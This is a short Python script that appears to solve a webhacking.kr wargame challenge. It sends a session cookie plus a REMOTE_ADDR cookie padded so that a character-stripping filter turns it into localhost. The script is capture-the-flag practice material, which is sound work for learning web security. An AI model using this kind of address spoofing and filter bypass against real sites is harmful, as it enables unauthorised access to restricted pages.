import requests

url='http://webhacking.kr/challenge/bonus/bonus-4/'
cookie=dict(PHPSESSID="n7ql4tcomoor289t98dhgt42m5",REMOTE_ADDR="112277..00..00..1")

r=requests.get(url,cookies=cookie)
print r.text